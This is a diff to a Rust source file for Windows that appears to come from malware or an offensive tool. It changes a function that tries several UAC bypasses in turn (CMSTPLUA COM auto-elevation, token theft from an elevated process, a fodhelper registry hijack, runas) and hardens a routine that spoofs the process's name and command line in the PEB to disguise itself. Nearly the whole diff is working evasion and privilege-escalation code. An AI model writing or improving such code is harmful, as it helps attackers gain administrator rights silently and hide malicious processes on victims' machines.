@@ -14,31 +14,32 @@ use std::ptr;
 
 // ── Public API ───────────────────────────────────────────────────────
 
-/// Attempt to elevate the current process. Returns Ok(()) if already admin
-/// or elevation succeeded. Returns Err if all strategies failed.
-pub fn try_elevate(exe_path: &str) -> Result<(), ()> {
+/// Attempt to elevate the current process. Returns Ok(true) if a new elevated
+/// process was spawned (caller should exit). Returns Ok(false) if already admin.
+/// Returns Err if all strategies failed.
+pub fn try_elevate(exe_path: &str) -> Result<bool, ()> {
     if is_admin() {
-        return Ok(());
+        return Ok(false);
     }
 
     // Strategy 1: COM Auto-Elevation via CMSTPLUA (silent, no registry writes)
     if cmstplua_elevate(exe_path).is_ok() {
-        std::process::exit(0);
+        return Ok(true);
     }
 
     // Strategy 2: Token stealing from an elevated process (silent)
     if token_steal_elevate(exe_path).is_ok() {
-        std::process::exit(0);
+        return Ok(true);
     }
 
     // Strategy 3: fodhelper.exe registry hijack (has registry trace, cleaned up)
     if fodhelper_elevate(exe_path).is_ok() {
-        std::process::exit(0);
+        return Ok(true);
     }
 
     // Strategy 4: ShellExecuteW runas (shows UAC prompt)
     if runas_elevate(exe_path) {
-        std::process::exit(0);
+        return Ok(true);
     }
 
     Err(())
@@ -351,26 +352,99 @@ pub fn spoof_peb(fake_name: &str) {
         std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
         if peb.is_null() { return; }
 
-        let process_params = *(peb.add(0x20) as *const *mut u8);
-        if process_params.is_null() { return; }
+        // Validate PEB pointer is in user-mode range (< 0x0000800000000000 on x64)
+        if peb as usize >= 0x0000800000000000 { return; }
 
+        // Read ProcessParameters pointer from PEB+0x20
+        let params_ptr = peb.add(0x20) as *const *mut u8;
+        // Validate the pointer itself is readable before dereferencing
+        if is_bad_read_ptr(params_ptr as *const u8, std::mem::size_of::<*mut u8>()) { return; }
+        let process_params = *params_ptr;
+        if process_params.is_null() { return; }
+        if process_params as usize >= 0x0000800000000000 { return; }
+
+        // ImagePathName is a UNICODE_STRING at offset 0x60 in RTL_USER_PROCESS_PARAMETERS
         let image_path = process_params.add(0x60) as *mut UnicodeString;
+        // CommandLine is a UNICODE_STRING at offset 0x70
         let command_line = process_params.add(0x70) as *mut UnicodeString;
+
+        // Validate both UnicodeString structs are readable before touching them
+        let us_size = std::mem::size_of::<UnicodeString>();
+        if is_bad_read_ptr(image_path as *const u8, us_size) { return; }
+        if is_bad_read_ptr(command_line as *const u8, us_size) { return; }
 
         let fake_wide = to_wide(fake_name);
 
-        if !(*image_path).Buffer.is_null() {
-            let copy_len = (fake_wide.len() * 2).min((*image_path).MaximumLength as usize);
-            ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*image_path).Buffer, copy_len / 2);
-            (*image_path).Length = copy_len as u16;
+        // Patch ImagePathName
+        if !(*image_path).Buffer.is_null() && (*image_path).MaximumLength > 0 {
+            let buf_size = (*image_path).MaximumLength as usize / 2; // in wchars
+            let copy_count = (fake_wide.len()).min(buf_size);
+            if !is_bad_write_ptr((*image_path).Buffer as *mut u8, copy_count * 2) {
+                ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*image_path).Buffer, copy_count);
+                (*image_path).Length = (copy_count * 2) as u16;
+            }
         }
 
-        if !(*command_line).Buffer.is_null() {
-            let copy_len = (fake_wide.len() * 2).min((*command_line).MaximumLength as usize);
-            ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*command_line).Buffer, copy_len / 2);
-            (*command_line).Length = copy_len as u16;
+        // Patch CommandLine
+        if !(*command_line).Buffer.is_null() && (*command_line).MaximumLength > 0 {
+            let buf_size = (*command_line).MaximumLength as usize / 2;
+            let copy_count = (fake_wide.len()).min(buf_size);
+            if !is_bad_write_ptr((*command_line).Buffer as *mut u8, copy_count * 2) {
+                ptr::copy_nonoverlapping(fake_wide.as_ptr(), (*command_line).Buffer, copy_count);
+                (*command_line).Length = (copy_count * 2) as u16;
+            }
         }
     }
+}
+
+/// Check if a pointer range is likely unreadable (VirtualQuery fallback).
+#[cfg(target_os = "windows")]
+unsafe fn is_bad_read_ptr(ptr: *const u8, size: usize) -> bool {
+    if ptr.is_null() || size == 0 { return true; }
+    // Quick sanity: check if pointer is in user-mode range
+    if ptr as usize >= 0x0000800000000000 { return true; }
+
+    extern "system" {
+        fn VirtualQuery(lpAddress: *const u8, lpBuffer: *mut MEMORY_BASIC_INFORMATION, dwLength: usize) -> usize;
+    }
+    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+    let ret = VirtualQuery(ptr, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>());
+    if ret == 0 { return true; }
+    // MEM_COMMIT = 0x1000, PAGE_NOACCESS = 0x01, PAGE_GUARD = 0x100
+    if mbi.State != 0x1000 { return true; }
+    if mbi.Protect & 0x01 != 0 || mbi.Protect & 0x100 != 0 { return true; }
+    false
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn is_bad_write_ptr(ptr: *mut u8, size: usize) -> bool {
+    if ptr.is_null() || size == 0 { return true; }
+    if ptr as usize >= 0x0000800000000000 { return true; }
+
+    extern "system" {
+        fn VirtualQuery(lpAddress: *const u8, lpBuffer: *mut MEMORY_BASIC_INFORMATION, dwLength: usize) -> usize;
+    }
+    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+    let ret = VirtualQuery(ptr as *const u8, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>());
+    if ret == 0 { return true; }
+    if mbi.State != 0x1000 { return true; }
+    // Check for write access: PAGE_READWRITE=0x04, PAGE_EXECUTE_READWRITE=0x40, PAGE_WRITECOPY=0x08
+    if mbi.Protect & 0x01 != 0 || mbi.Protect & 0x100 != 0 { return true; }
+    false
+}
+
+#[cfg(target_os = "windows")]
+#[repr(C)]
+struct MEMORY_BASIC_INFORMATION {
+    BaseAddress: *mut u8,
+    AllocationBase: *mut u8,
+    AllocationProtect: u32,
+    _pad0: u32,
+    RegionSize: usize,
+    State: u32,
+    Protect: u32,
+    Type: u32,
+    _pad1: u32,
 }
 
 // ── Helpers ─────────────────────────────────────────────────────────
